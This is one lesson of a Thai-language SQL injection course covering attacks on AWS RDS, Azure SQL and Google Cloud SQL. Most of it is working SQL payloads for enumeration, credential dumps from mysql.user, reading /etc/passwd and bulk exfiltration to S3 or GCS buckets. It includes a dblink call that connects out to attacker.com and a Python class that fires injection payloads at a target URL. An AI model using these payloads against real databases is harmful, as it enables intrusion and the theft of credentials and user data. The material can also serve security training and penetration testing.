# Part 044: SQL Injection ใน Cloud Databases

## ภาพรวม

Cloud-managed databases (AWS RDS, Azure SQL, Google Cloud SQL) มีเทคนิค exploit แตกต่างจาก on-premise

**ขั้นตอนที่ 681-700**

---

## 681. AWS RDS MySQL

```sql
-- ตรวจสอบ version/environment
SELECT @@version;
SELECT @@hostname;  -- RDS identifier
SELECT @@basedir;

-- AWS RDS สิ่งที่ทำไม่ได้:
-- 1. FILE privilege ถูก block โดย AWS
-- 2. LOAD_FILE() ไม่ทำงาน
-- 3. INTO OUTFILE ถูก restrict
-- 4. UDF ไม่สามารถ load เพิ่มได้

-- สิ่งที่ยังทำได้:
SELECT * FROM information_schema.tables;  -- Enumeration
SELECT user, password FROM mysql.user;    -- Credential dump (ถ้า DBA)
SELECT * FROM sensitive_table;            -- Data exfil

-- Check S3 integration
SELECT @@aws_default_s3_role;

-- S3 Outfile (ถ้า enabled)
SELECT * FROM users INTO OUTFILE 'S3 s3://bucket/data.txt'
FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n';
```

---

## 682. AWS RDS PostgreSQL

```sql
-- Version check
SELECT version();

-- RDS PostgreSQL limitations:
-- 1. ไม่มี superuser (rds_superuser)
-- 2. COPY FROM PROGRAM ใช้ไม่ได้ (no OS exec)
-- 3. pg_read_file ถูก block

-- สิ่งที่ทำได้:
SELECT current_user;
SELECT pg_read_binary_file('/etc/passwd');  -- อาจทำได้ (depends on version)

-- dblink (OOB DNS) ยังทำได้:
SELECT * FROM dblink('host=attacker.com user=a password=b dbname=c',
  'SELECT 1') AS t(x int);

-- RDS S3 extension:
SELECT * FROM aws_s3.query_export_to_s3(
  'SELECT * FROM users',
  aws_commons.create_s3_uri('bucket','file.csv','us-east-1'),
  options := 'FORMAT CSV'
);
```

---

## 683. Azure SQL Database

```sql
-- Azure SQL Injection เหมือน MSSQL แต่มีข้อจำกัด

-- Azure SQL limitations:
-- 1. xp_cmdshell ไม่มี (completely removed)
-- 2. OPENROWSET ถูก restrict
-- 3. Linked servers ไม่ available

-- สิ่งที่ยังทำได้:
SELECT name FROM sys.databases;
SELECT TOP 10 * FROM sensitive_table;

-- Time-based blind ยังทำได้:
IF (1=1) WAITFOR DELAY '0:0:5'--

-- Stacked queries (depends on driver):
'; SELECT name FROM sys.databases--

-- MSSQL full-text search injection:
SELECT * FROM CONTAINSTABLE(products, description, '"test" OR "'+@input+'"');
```

---

## 684. Google Cloud SQL

```sql
-- Cloud SQL MySQL เหมือน AWS RDS MySQL

-- Cloud SQL สิ่งที่ต่าง:
-- 1. ไม่มี FILE privilege
-- 2. Cloud Storage integration (ถ้า configured)

-- ตรวจสอบ environment:
SELECT @@version;
SELECT @@global.hostname;

-- Cloud Storage OUTFILE (ถ้า enabled):
SELECT * FROM users INTO OUTFILE 'gs://bucket/dump.csv'
FIELDS TERMINATED BY ',';
```

---

## 685. Cloud SQL Detection Tool

```python
import requests
from typing import Optional

class CloudSQLITester:
    """Test SQL injection in cloud-hosted databases"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
    
    def detect_cloud_provider(self) -> Optional[str]:
        """Detect cloud database provider via error messages"""
        payloads = {
            'AWS RDS': "' AND 1=CONVERT(int,(SELECT @@version))--",
            'Azure SQL': "' AND 1=CONVERT(int,(SELECT @@SERVERNAME))--",
            'GCP Cloud SQL': "' AND 1=EXTRACTVALUE(1,(SELECT @@version))--",
        }
        
        for provider, payload in payloads.items():
            r = self.session.get(self.target_url, params={'id': payload})
            content = r.text.lower()
            
            if 'rds' in content or 'amazonaws' in content:
                return 'AWS RDS'
            if 'azure' in content or 'database.windows.net' in content:
                return 'Azure SQL'
            if 'cloudsql' in content or 'google' in content:
                return 'GCP Cloud SQL'
        
        return None
    
    def test_file_privilege(self) -> bool:
        """Test if FILE privilege is available"""
        payload = "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -"
        r = self.session.get(self.target_url, params={'id': payload})
        return 'root:' in r.text
    
    def test_s3_outfile(self, bucket: str) -> bool:
        """Test AWS S3 OUTFILE capability"""
        payload = f"' UNION SELECT 'test' INTO OUTFILE 'S3 s3://{bucket}/test.txt'-- -"
        r = self.session.get(self.target_url, params={'id': payload})
        return r.status_code == 200 and 'error' not in r.text.lower()
```

---

## สรุป

Cloud SQL Injection:
- **AWS RDS** - FILE blocked, S3 OUTFILE available (if enabled)
- **Azure SQL** - xp_cmdshell removed, WAITFOR still works
- **GCP Cloud SQL** - GCS OUTFILE available (if enabled)
- **ทั้งหมด** - Data enumeration/exfil ยังทำได้, OS exec ถูก block

---

*Part 044 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
